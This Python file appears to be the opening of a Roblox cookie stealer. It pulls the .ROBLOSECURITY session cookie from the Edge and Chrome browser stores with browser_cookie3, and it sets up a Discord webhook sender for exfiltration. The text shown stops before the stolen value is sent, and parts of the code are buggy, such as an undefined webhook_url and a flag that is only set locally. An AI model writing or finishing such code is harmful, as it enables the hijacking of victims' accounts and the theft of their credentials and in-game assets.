from discord_webhook import DiscordWebhook
import tkinter
from tkinter import ttk
import browser_cookie3

# note make sure to define webhook_url

def send_discord_webhook(message):
    webhook = DiscordWebhook(url=webhook_url, content=message)
    response = webhook.execute()

webhook = DiscordWebhook(url='your_discord_webhook_url_here')
edge = True
chrome = True
firefox = True
def logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        roblo_security = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    except:
        edge = False
        pass
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        roblo_security = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    except:
        pass